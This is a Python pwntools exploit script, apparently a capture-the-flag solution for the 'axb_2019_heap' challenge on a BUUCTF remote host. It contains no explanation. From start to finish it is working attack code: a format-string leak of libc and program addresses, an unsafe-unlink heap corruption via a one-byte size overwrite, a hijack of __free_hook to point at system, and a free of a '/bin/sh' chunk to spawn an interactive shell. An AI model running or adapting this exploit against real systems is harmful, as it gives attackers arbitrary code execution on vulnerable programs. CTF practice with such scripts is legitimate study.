from pwn import *
import sys
remote_addr = ["node4.buuoj.cn",29604]
libc = ELF('./libc-2.23.so')
#elf = ELF('')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./axb_2019_heap_patched")
    context(arch='amd64', os='linux')
    context.terminal = ['tmux', 'splitw', '-h']
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

DEBUG = 0

def debug(bp = None):
    if DEBUG == 1:
        if bp != None:
            gdb.attach(p, bp)
        else:
            gdb.attach(p)

def menu(idx):
    sa(b'>> ', str(idx).encode())

def add(idx, size, content):
    menu(1)
    sla(b':', str(idx).encode())
    sla(b'size:', str(size).encode())
    sla(b': \n', content)

def delete(idx):
    menu(2)
    sla(b'index:', str(idx).encode())

def edit(idx, content):
    menu(4)
    sla(b'index:', str(idx).encode())
    sla(b'content: \n', content)

debug('''
    b *$rebase(0x1016)
''')
sla(b'name: ', b'%15$p.%19$p')
ru(b'0x')
libc.address = int(ru(b'.')[:-1], 16) - 0x20830
pro_base = int(ru(b'\n'), 16) - 0x116a
note = pro_base + 0x202060
pr('libc.address', libc.address)
pr('pro_base', pro_base)

add(0, 0x98, b'aaaa')
add(1, 0x98, b'abcd')
add(2, 0x98, b'dcba')

fd = note - 0x18
bk = note - 0x10

payload = p64(0) + p64(0x90)
payload += p64(fd) + p64(bk)
payload += b'a' * 0x70
payload += p64(0x90) + p8(0xa0)
edit(0, payload)
delete(1)

free_hook = libc.sym['__free_hook']
system = libc.sym['system']
payload = p64(0) * 3 
payload += p64(free_hook) + p64(0x98)
payload += p64(note + 24) + b'/bin/sh\x00'
edit(0, payload)

edit(0, p64(system))
delete(1)

shell()
